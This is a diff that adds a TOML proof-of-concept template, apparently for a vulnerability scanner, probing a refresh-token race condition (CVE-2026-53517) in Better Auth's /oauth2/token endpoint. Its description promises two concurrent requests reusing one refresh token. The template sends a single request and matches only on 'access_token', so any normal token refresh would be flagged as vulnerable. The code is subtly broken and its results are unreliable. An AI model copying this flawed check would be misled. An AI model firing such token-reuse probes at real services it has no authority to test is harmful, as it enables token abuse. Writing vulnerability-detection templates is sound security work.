@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "验证 Better Auth OAuth 刷新令牌并发竞争条件：发送两个并发请求携带同一父刷新令牌到 /oauth2/token 端点，若两者均返回新令牌则存在漏洞"
+id = "POC-AVE-2026-0407"
+name = "CVE-2026-53517 PoC"
+severity = "high"
+tags = ["ave-2026-0407"]
+vuln_id = [
+    "CVE-2026-53517",
+    "AVE-2026-0407",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/oauth2/token"
+protocol = "http"
+
+[poc.requests.body]
+content = "grant_type=refresh_token&refresh_token={{token}}&client_id={{client_id}}"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["access_token"]
